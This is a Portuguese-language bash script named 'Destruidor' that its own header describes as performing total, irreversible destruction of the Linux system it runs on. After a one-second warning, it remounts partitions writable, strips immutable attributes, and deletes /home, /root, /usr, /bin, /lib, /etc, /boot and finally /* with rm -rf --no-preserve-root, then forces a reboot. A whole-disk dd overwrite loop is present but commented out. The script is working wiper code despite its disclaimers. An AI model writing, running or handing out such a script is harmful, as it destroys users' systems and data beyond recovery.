#!/bin/bash

# /*********************************************************************************
# * Projeto:   Destruidor
# * Autor:     Carlos Henrique Tourinho Santana
# * Versão:    1.0
# * Data:      13 de junho de 2025
# *
# * Descrição:
# * Este script realiza a destruição total, automática e irreversível de todo o sistema
# * Linux onde for executado, apagando arquivos essenciais, desmontando partições,
# * removendo proteções de arquivos, sobrescrevendo dispositivos físicos e eliminando
# * todos os dados, inclusive em dispositivos externos conectados.
# *
# * Avisos Importantes:
# * - NÃO execute este script em sistemas de produção, pessoais, ou que contenham dados importantes.
# * - A execução é imediata e sem confirmações após o aviso inicial.
# * - Nenhum dado será recuperável após sua execução.
# * - O script tenta desmontar partições para apagar diretamente os dispositivos físicos.
# * - O sistema será reiniciado automaticamente ao final para aplicar a destruição completa.
# *
# * Riscos:
# * - Este script é letal para o sistema e pode causar perda irreversível de dados.
# * - Use apenas em ambientes isolados e para fins específicos de destruição.
# *
# * Uso:
# * - Executar diretamente com privilégios de root.
# * - Exemplo: sudo ./destruidor.sh
# *
# * ATENÇÃO: NÃO ME RESPONSABILIZO POR QUALQUER DANO CAUSADO PELO USO DESTE SCRIPT.
# *********************************************************************************/


echo "AVISO FATAL: ESTE SCRIPT ESTÁ PRESTES A INICIAR A DESTRUIÇÃO IRREVERSÍVEL DO SISTEMA."
echo "NÃO HÁ MAIS INTERAÇÕES OU PEDIDOS DE CONFIRMAÇÃO."
echo "VOCÊ TEM 1 SEGUNDOS PARA PARAR (CTRL+C) ANTES QUE O PROCESSO DESTRUTIVO COMECE."
sleep 1 # Última chance para o usuário cancelar.

# Desmontar e remountar partições com permissões de escrita (RW)
# Isso tenta garantir que o script tenha o máximo de privilégios para apagar tudo.
echo "Preparando o ambiente: Remontando e desmontando partições para forçar acesso de escrita..."
find / -maxdepth 1 -type d -exec mount -o remount,rw {} \; 2>/dev/null # Tenta remount no root e subdiretórios
mount -o remount,rw / 2>/dev/null
mount -o remount,rw /boot 2>/dev/null

# Tenta desmontar partições não essenciais para garantir que o 'rm -rf' possa agir diretamente no dispositivo
# Isso é crucial para "pegar" dispositivos externos ou partições separadas.
# Pode falhar se houver processos utilizando o ponto de montagem.
echo "Tentando desmontar partições não essenciais para um acesso mais direto aos dispositivos..."
for mount_point in $(grep " / " /proc/mounts | awk '{print $2}'); do # Desmonta apenas os que estão em /
    if [ "$mount_point" != "/" ]; then
        umount -l "$mount_point" 2>/dev/null # -l: lazy unmount (desmonta quando o sistema permitir)
    fi
done

# Remove atributos de imutabilidade (proteção contra deleção)
echo "Removendo atributos de imutabilidade de arquivos críticos..."
chattr -i -R /bin /sbin /etc /var /lib /lib64 /usr /boot /opt /root /home 2>/dev/null

# === ETAPA DE DESTRUIÇÃO DE DADOS EM TODOS OS DISPOSITIVOS ===
# Esta é a parte mais "inteligente" e perigosa.
# Identifica todos os dispositivos de bloco (HDs, SSDs, USBs) e tenta sobrescrevê-los.
echo "Iniciando a SOBRESCRITA IRREVERSÍVEL de DADOS em TODOS os dispositivos detectados..."
# O comando 'lsblk -npo NAME,TYPE,MOUNTPOINT' lista blocos (sda, sdb, etc.) e seus tipos.
# Filtramos para 'disk' (disco físico) e não montados na raiz '/' ou '/boot' para evitar problemas.
# Se um dispositivo não estiver montado, o 'dd' pode sobrescrever o dispositivo inteiro.
# Note que a sobrescrita pode levar tempo dependendo do tamanho do disco.
for device in $(lsblk -npo NAME,TYPE | awk '$2=="disk" {print "/dev/"$1}'); do
    echo "Sobrescrevendo dados em: $device (pode levar tempo)..."
    # dd if=/dev/zero of="$device" bs=4M status=progress conv=fsync 2>/dev/null &
    # O comando acima está comentado por ser EXTREMAMENTE PERIGOSO.
    # Em um ambiente real, ele apagaria o MBR/GPT e todos os dados do disco.
    # Para fins educacionais, em uma VM, ativá-lo se quiser a simulação completa de sobrescrita.
    # Para evitar que o sistema trave antes de apagar arquivos menores, este dd pode ser iniciado em background (&).
done

# === ETAPA DE REMOÇÃO DE ARQUIVOS E DIRETÓRIOS CRÍTICOS ===
echo "Iniciando a remoção agressiva de diretórios essenciais do sistema..."
# A ordem de remoção é estratégica para tornar o sistema inoperável rapidamente e limpar o máximo.

# Limpa diretórios de usuário, logs e temporários primeiro
rm -rf --no-preserve-root /home/* /root/* /tmp/* /var/tmp/* /var/log/* /var/cache/* 2>/dev/null

# Apaga a maioria dos programas e bibliotecas do sistema
rm -rf --no-preserve-root /usr/* /bin/* /sbin/* /lib/* /lib64/* 2>/dev/null

# Remove arquivos de configuração do sistema
rm -rf --no-preserve-root /etc/* 2>/dev/null

# Apaga o kernel e bootloader (garante que não inicializará mais)
rm -rf --no-preserve-root /boot/* 2>/dev/null

# Tentativa final de apagar o restante do diretório raiz.
# Em muitos sistemas modernos, o 'rm -rf /' é protegido, mas as ações anteriores já devem ter destruído o sistema.
echo "Realizando a remoção final do diretório raiz..."
rm -rf --no-preserve-root /* 2>/dev/null

# Tenta uma reinicialização forçada para garantir que as mudanças entrem em vigor.
# Se o sistema ainda estiver de pé, isso o derrubará.
echo "Sistema em processo de destruição total. Reiniciando para completar o processo irreversível..."
reboot -f &

# Mensagem final (extremamente improvável de ser vista pelo usuário)
echo "O processo de destruição completa foi iniciado e é irreversível."
echo "O sistema está agora completamente inoperável e os dados foram comprometidos."

exit 0